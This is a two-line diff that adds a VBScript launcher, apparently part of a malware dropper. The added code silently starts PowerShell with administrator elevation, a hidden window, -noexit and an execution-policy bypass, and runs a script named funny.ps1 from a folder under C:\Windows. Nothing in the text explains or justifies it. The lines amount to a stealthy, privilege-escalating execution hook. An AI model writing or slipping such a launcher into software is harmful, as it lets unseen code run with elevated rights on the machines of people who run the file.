@@ -1,0 +1,2 @@
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -Command ""Start-Process powershell -Verb runAs -ArgumentList '-WindowStyle','Hidden','-noexit','-ExecutionPolicy','bypass','-File','C:\Windows\Vsa\funny.ps1'""", 0, False
